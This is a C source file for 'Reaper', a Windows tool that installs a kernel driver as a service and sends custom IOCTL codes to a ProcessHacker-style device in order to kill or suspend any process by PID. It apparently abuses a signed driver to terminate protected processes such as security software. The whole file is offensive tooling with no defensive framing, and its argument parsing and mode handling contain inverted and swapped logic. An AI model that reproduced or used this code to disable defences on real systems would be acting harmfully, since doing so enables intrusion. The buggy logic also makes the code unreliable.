#include <stdio.h>
#include <windows.h>

#define DRIVE_SERVICE_NAME "Reaper"
#define DRIVE_FILE_NAME DRIVE_SERVICE_NAME ".sys"
#define DRIVER_PATH L"\\\\.\\GlobalRoot\\Device\\KProcessHacker2"
#define IOCTL_CODE_KILLPROCESS 0x999920df
#define IOCTL_CODE_SUSPENDPROC 0x999920d7

VOID Banner() {
    printf(R"EOF(
      ____                            
     / __ \___  ____ _____  ___  _____
    / /_/ / _ \/ __ `/ __ \/ _ \/ ___/
   / _, _/  __/ /_/ / /_/ /  __/ /    
  /_/ |_|\___/\__,_/ .___/\___/_/     
                  /_/                                          
                                  
          [Coded by MrEmpy]
               [v1.0]

)EOF");
}

VOID Help(char* progname) {
    Banner();
    printf(R"EOF(Usage: %s [OPTIONS] [VALUES]
    Options:
      sp,                   suspend process
      kp,                   kill process

    Values:
      PROCESSID,             process id to suspend/kill

    Examples:
      Reaper.exe sp 1337
      Reaper.exe kp 1337
)EOF", progname);
}

VOID Arguments(int argc, char* argv[], int* mode) {
    if (argv[1] == NULL) {
        Help(argv[0]);
        exit(0);
    }

    if (strncmp(argv[1], "sp", sizeof("sp"))) {
        if (argv[2] == NULL) {
            Help(argv[0]);
            exit(0);
        }
        *mode = 1;
    }
    else if (strncmp(argv[1], "kp", sizeof("kp"))) {
        if (argv[2] == NULL) {
            Help(argv[0]);
            exit(0);
        }
        *mode = 0;
    }
}

BOOL DeployDriver(char* driverPath) {
    SC_HANDLE schSCManager, schService;

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        printf("[-] There was a problem trying to open the Service Control Manager: %ld\n", GetLastError());
        return 1;
    }

    schService = CreateServiceA(
        schSCManager,
        DRIVE_SERVICE_NAME,
        DRIVE_SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (GetLastError() == ERROR_SERVICE_EXISTS) {
        puts("[*] The service already exists");
        return 1;
    }
    
    if (StartServiceW(schService, 0, NULL) == ERROR_SERVICE_ALREADY_RUNNING) {
        puts("[*] The service has already started");
        return 1;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return 0;
}

BOOL UninstallDriver() {
    SC_HANDLE schSCManager, schService;
    SERVICE_STATUS serviceStatus;

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        printf("[-] There was a problem trying to open the Service Control Manager: %ld\n", GetLastError());
    }

    schService = OpenServiceA(schSCManager, DRIVE_SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (schService == NULL) {
        printf("[-] There was an error trying to open the service: %ld\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return 1;
    }

    if (!ControlService(schService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        printf("[-] There was an error trying to stop the service: %ld\n", GetLastError());
    }
    
    if (!DeleteService(schService)) {
        printf("[-] There was an error trying to delete the service: %ld. Delete the service with the \"sc delete Reaper\" command\n", GetLastError());
        return 1;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return 0;
}

BOOL SuspendProcess(HANDLE hDriver, HANDLE procHandle) {
    struct {
        HANDLE procHandle;
    } ioInput;
    ioInput.procHandle = procHandle; // NTSTATUS status = PsSuspendProcess_I(process);

    PVOID output;
    BOOL result = DeviceIoControl(hDriver, IOCTL_CODE_SUSPENDPROC, (LPVOID)&ioInput, sizeof(ioInput), &output, sizeof(output), 0, NULL);
    if (result == 1) {
        return -1;
    }

    return 0;
}

BOOL KillProcess(HANDLE hDriver, HANDLE procHandle) {
    struct {
        HANDLE procHandle;
        NTSTATUS ExitStatus;
    } ioInput;
    ioInput.procHandle = procHandle; // NTSTATUS status = ZwTerminateProcess(procHandle, 0);
    ioInput.ExitStatus = 0;

    PVOID output;
    BOOL result = DeviceIoControl(hDriver, IOCTL_CODE_KILLPROCESS, (LPVOID)&ioInput, sizeof(ioInput), &output, sizeof(output), 0, NULL);
    if (result == 1) {
        return -1;
    }

    return 0;
}

int main(int argc, char* argv[])
{
    int mode;
    Arguments(argc, argv, &mode);
    int pid = atoi(argv[2]);

    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (procHandle == NULL) {
        printf("[-] There was a problem trying to open the process handle: %ld\n", GetLastError());
        return 1;
    }

    WIN32_FIND_DATAA driverData;
    char driverFullPath[MAX_PATH];
    if (FindFirstFileA(DRIVE_FILE_NAME, &driverData) != INVALID_HANDLE_VALUE) {
        if (GetFullPathNameA(driverData.cFileName, MAX_PATH, driverFullPath, NULL) == 0) {
            printf("[-] There was a problem trying to identify the full driver path: %ld\n", GetLastError());
            return -1;
        }
    }

    if (DeployDriver(driverFullPath) == 0) {
        puts("[+] Service created and started successfully!");
    }

    HANDLE hDriver = CreateFile(DRIVER_PATH, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[-] There was a problem opening the driver: %ld\n", GetLastError());
        return -1;
    }

    if (mode == 0) {
        if (SuspendProcess(hDriver, procHandle)) {
            printf("[+] Process %d suspended!\n", pid);
        }
    }
    else if (mode == 1) {
        if (KillProcess(hDriver, procHandle)) {
            printf("[+] Process %d killed!\n", pid);
        }
    }

    if (UninstallDriver() == 0) {
        puts("[+] Service uninstalled successfully!");
    }
    
    return 0;
}
